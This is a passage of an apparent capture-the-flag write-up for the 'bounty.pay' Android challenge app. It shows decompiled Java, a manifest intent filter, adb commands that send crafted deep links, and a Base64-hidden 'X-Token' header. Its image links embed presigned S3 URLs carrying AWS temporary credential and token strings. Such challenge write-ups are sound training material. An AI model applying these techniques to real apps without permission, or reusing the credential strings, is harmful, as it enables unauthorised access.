class=\"n\"\u003estr1\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;light\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"kc\"\u003enull\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \u003cspan class=\"n\"\u003estr2\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eequals\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;on\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"n\"\u003eeditText\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003ebutton\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etextView\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esetVisibility\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003cspan class=\"o\"\u003e}\u003c/span\u003e \n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand the corresponding intent defined within \u003ccode\u003eAndroidManifest.xml\u003c/code\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;activity\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@string/title_activity_part_two\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;bounty.pay.PartTwoActivity\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:theme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;@style/AppTheme.NoActionBar\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;intent-filter\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:label=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;action\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.action.VIEW\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.DEFAULT\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;category\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:name=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;android.intent.category.BROWSABLE\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"nt\"\u003e\u0026lt;data\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:host=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;part\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003eandroid:scheme=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;two\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/intent-filter\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/activity\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo similar to the first step I crafted the following deep link and sent it to the app:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eadb shell am start \u003cspan class=\"nt\"\u003e-W\u003c/span\u003e \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e android.intent.action.VIEW \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;two://part/?two=light\u0026amp;switch=on\u0026quot;\u003c/span\u003e bounty.pay\n/system/bin/sh: bounty.pay: not found\nStarting: Intent \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003eact\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eandroid.intent.action.VIEW \u003cspan class=\"nv\"\u003edat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etwo://part/?two\u003cspan class=\"o\"\u003e=\u003c/span\u003elight \u003cspan class=\"o\"\u003e}\u003c/span\u003e\nStatus: ok\nActivity: bounty.pay/.PartTwoActivity\nThisTime: 368\nTotalTime: 368\nWaitTime: 384\nComplete\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhich failed... you can see it only sent first parameter, and also there was an error that a package was not found. It was easy enough to find the \u003ca href=\"/redirect?url=https%3A%2F%2Fstackoverflow.com%2Fa%2F35645448%2F5540279\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eanswer\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e on stackoverflow, and the issue was that \u003ccode\u003e\u0026amp;\u003c/code\u003e needs to be escaped with \u003ccode\u003e\\\u003c/code\u003e (or alternatively one could wrap the shell command in single quotes):\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight shell\"\u003e\u003ccode\u003e\u003cspan class=\"nv\"\u003e$ \u003c/span\u003eadb shell am start \u003cspan class=\"nt\"\u003e-W\u003c/span\u003e \u003cspan class=\"nt\"\u003e-a\u003c/span\u003e android.intent.action.VIEW \u003cspan class=\"nt\"\u003e-d\u003c/span\u003e \u003cspan class=\"s2\"\u003e\u0026quot;two://part/?two=light\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026amp;\u003c/span\u003e\u003cspan class=\"s2\"\u003eswitch=on\u0026quot;\u003c/span\u003e bounty.pay\nStarting: Intent \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"nv\"\u003eact\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eandroid.intent.action.VIEW \u003cspan class=\"nv\"\u003edat\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etwo://part/?two\u003cspan class=\"o\"\u003e=\u003c/span\u003elight\u0026amp;switch\u003cspan class=\"o\"\u003e=\u003c/span\u003eon \u003cspan class=\"nv\"\u003epkg\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ebounty.pay \u003cspan class=\"o\"\u003e}\u003c/span\u003e\nStatus: ok\nActivity: bounty.pay/.PartTwoActivity\nThisTime: 241\nTotalTime: 241\nWaitTime: 258\nComplete\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe\u0026#39;re now presented with an input field where we need to guess a Header value, which would be checked against Firebase:\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"android-part-two-activity.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iya7Dx8ZbbrqwY7h9AjX9bNm?response-content-disposition=attachment%3B%20filename%3D%22android-part-two-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-two-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=3e65c13dfd3ea4ab9e27e64bce674aa3d8c4c583d6a64fe66e893f1f30db0e27\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/iya7Dx8ZbbrqwY7h9AjX9bNm?response-content-disposition=attachment%3B%20filename%3D%22android-part-two-activity.png%22%3B%20filename%2A%3DUTF-8%27%27android-part-two-activity.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQSUJSTWNA%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070811Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDC4LZo82wc2eCvBFlhjwE027CwJoHB88%2BMK2v03JEf7AIgTsNTuR7XI5zLkpcU%2F192zliPMALv25wXWHyoW56mHW0qtAMIVRABGgwwMTM2MTkyNzQ4NDkiDDQxd6Ep%2FudaJolhjiqRA%2FV9m3Q5qTHiEf%2B0F56QxIa0FX4xcw3kyVQ754zuEWG6%2FFHm5u50c%2FkjIZTK4iokf%2F5bg8%2F9lzPcfaf%2FlyMeeuZQiIR66c8Q0ZynlQYFFg39COCCRcmQH0rk4Py7SioeZK1WX50szdnMCAEBM0%2FYGIJRFlpJYz5%2BF7cuCEDZDVFz70QPaeLM9Aq2Hp0OWlaD%2BlKU2Ya8oXmKGTVLeV6xTf66mRdzvW8I4qKgZpByKnAcip5WWnkttPjUxPiLaEeZ%2BClnUyHZas2bB1iPmPH0rQXcKWbTOq%2BJJm8xX%2FgqtqSgjGTmncJVZJxe0UaRUPXS%2BxPh0KYERT9Te4D5sREOcmaPJ0lojWm5AuNIxK3S30FeTamdldG5jOgcjm7r6e2HjWcB7yfe4%2BCsYd2eVLbbXk95jZRHQohr%2B7Z9YEqq00TUANe07BXm%2FKoAPBMy0bYQHYmVJaGS31XhmN6DRKUn5mwwU6NQ87eIymigu48swQSaSOa0S3Ve15n99tYKCLxw%2FqcLrXK9DmAPRXyB2cTH85tpMJ7Qqv8FOusB0TY7T%2F8PPlS9Pw17cj5sLPnZSdHFb4OJ7xNuArhvZUxC%2FDdQIpfgbN40hDHy3r94ejzq63ULcWroBoxExSJ8F%2BIqLrT2jEE%2BHYV9rJ3uN20mlrWN07M1wfpVQeu7mZyiWu%2BTKEOjyLznji7d3Efn7A1SwzF%2FWi11RcA9%2BGeNTFCiOeyJRV4JWopx6NNi8TVr6hBraJmZeqXIUCIj4yW%2BvdbZ%2F7b%2BDWNq1S8BMna3Htt9r6lmeANRYdDH%2BkiA2F6n7nJrrrNm3hF7NHjHy1GdUin3XffXKseDfHdRNqxNelH1SrChi2zziLtHrQ%3D%3D\u0026amp;X-Amz-Signature=3e65c13dfd3ea4ab9e27e64bce674aa3d8c4c583d6a64fe66e893f1f30db0e27\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eSince I already read the entire source code I knew the answer for it. Within \u003ccode\u003ePartThreeActivity.java\u003c/code\u003e we see the following line:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kt\"\u003ebyte\u003c/span\u003e\u003cspan class=\"o\"\u003e[]\u003c/span\u003e \u003cspan class=\"n\"\u003edecodedDirectoryTwo\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eBase64\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003edecode\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;WC1Ub2tlbg==\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhen decoded, this value is \u003ccode\u003eX-Token\u003c/code\u003e, and that\u0026#39;s exactly the header value we need to enter. You can also see an MD5 hash on the screen, \u003ccode\u003e459a6f79ad9b13cbcb5f692d2cc7a94d\u003c/code\u003e. Googling this value tells us that this is the hash for the word \u003ccode\u003eToken\u003c/code\u003e. It was hinting at the fact that the Header of interest is \u003ccode\u003eX-Token\u003c/code\u003e.\u003c/p\u003e\n\n\u003cp\u003eWhen I tried it, it didn\u0026#39;t work. Checking the process log within Android Studio, I saw:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCaused by: javax.net.ssl.SSLHandshakeException: java.security.cert.CertPathValidatorException: Trust anchor for certification path not found.\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eThis was clearly caused by intercepting traffic with Burp proxy. I simply turned off the proxy and it worked. There surely must have been a way to resolve certificate issues, but intercepting traffic wasn\u0026#39;t necessary at all for this challenge, so I went with the easy route. With that issue resolved, submitting\u003ccode\u003eX-Token\u003c/code\u003e as the Header value moves us to the next activity:\u003c/p\u003e\n\n\u003ch3 id=\"android-partthreeactivity\"\u003eAndroid | PartThreeActivity\u003c/h3\u003e\n\n\u003cp\u003eWe again see the blank screen with hints: \u003ccode\u003eReuse some params.\u003c/code\u003e and \u003ccode\u003eIntercept or check for leaks.\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eBased on the java code, at the start of this activity the app should have authenticated anonymously with Firebase and fetched the values for Token and Host and saved them to a local preferences file:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"nc\"\u003eHandler\u003c/span\u003e \u003cspan class=\"n\"\u003ehandler\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eHandler\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n\u003cspan class=\"n\"\u003ehandler\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epostDelayed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eRunnable\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Starting authentication\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esignIn\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"mi\"\u003e10000L\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003ehandler\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epostDelayed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eRunnable\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Getting host endpoint\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetHost\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"mi\"\u003e20000L\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003cspan class=\"n\"\u003ehandler\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003epostDelayed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eRunnable\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n      \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003erun\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ei\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Getting Token\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n        \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetToken\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"mi\"\u003e20000L\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight java\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003eprivate\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003esignIn\u003c/span\u003e\u003cspan class=\"o\"\u003e()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emAuth\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nc\"\u003eFirebaseAuth\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetInstance\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n  \u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emAuth\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003esignInAnonymously\u003c/span\u003e\u003cspan class=\"o\"\u003e().\u003c/span\u003e\u003cspan class=\"na\"\u003eaddOnCompleteListener\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"k\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nc\"\u003eOnCompleteListener\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eAuthResult\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;()\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"kd\"\u003epublic\u003c/span\u003e \u003cspan class=\"kt\"\u003evoid\u003c/span\u003e \u003cspan class=\"nf\"\u003eonComplete\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nc\"\u003eTask\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"nc\"\u003eAuthResult\u003c/span\u003e\u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1Task\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n          \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eparam1Task\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003eisSuccessful\u003c/span\u003e\u003cspan class=\"o\"\u003e())\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ed\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;signInAnonymously:success\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e);\u003c/span\u003e\n            \u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emAuth\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetCurrentUser\u003c/span\u003e\u003cspan class=\"o\"\u003e();\u003c/span\u003e\n            \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"o\"\u003e;\u003c/span\u003e\n          \u003cspan class=\"o\"\u003e}\u003c/span\u003e \n          \u003cspan class=\"nc\"\u003eLog\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ew\u003c/span\u003e\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;TAG\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;signInAnonymously:failure\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eparam1Task\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003egetException\u003c/span\u003e\u003cspan class=\"o\"\u003e());\u003c/span\u003e\n          \u003cspan class=\"nc\"\u003eToast\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003emakeText\u003c/span\u003e\u003cspan class=\"o\"\u003e((\u003c/span\u003e\u003cspan class=\"nc\"\u003eContext\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"nc\"\u003ePartThreeActivity\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"na\"\u003ethis\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;Authentication failed.\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e,\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"o\"\u003e).\u003c/span\u003e\u003cspan class=\"na\"\u003eshow\u003c/span\u003e\u003cspan 